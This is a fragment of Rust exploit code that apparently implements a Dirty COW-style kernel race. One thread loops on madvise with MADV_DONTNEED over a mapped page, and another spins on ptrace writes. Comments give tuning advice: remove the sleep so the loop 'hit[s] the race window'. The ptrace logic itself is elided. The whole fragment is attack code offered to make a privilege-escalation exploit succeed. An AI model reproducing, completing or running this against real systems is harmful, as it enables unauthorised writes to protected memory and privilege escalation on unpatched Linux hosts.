// --- Updated Thread A: The Aggressor ---
thread::spawn(move || {
let map_ptr = map_usize as *mut libc::c_void;
while r_clone.load(Ordering::Relaxed) {
unsafe { libc::madvise(map_ptr, 4096, libc::MADV_DONTNEED); }
// Yielding is safer than sleeping for stability
thread::yield_now();
}
});

// --- Updated Thread B: The Writer loop ---
while running.load(Ordering::Relaxed) {
// ... (ptrace logic stays the same) ...

// Remove the thread::sleep(Duration::from_millis(10)) here!
// We want this loop to spin as fast as possible to hit the race window.
}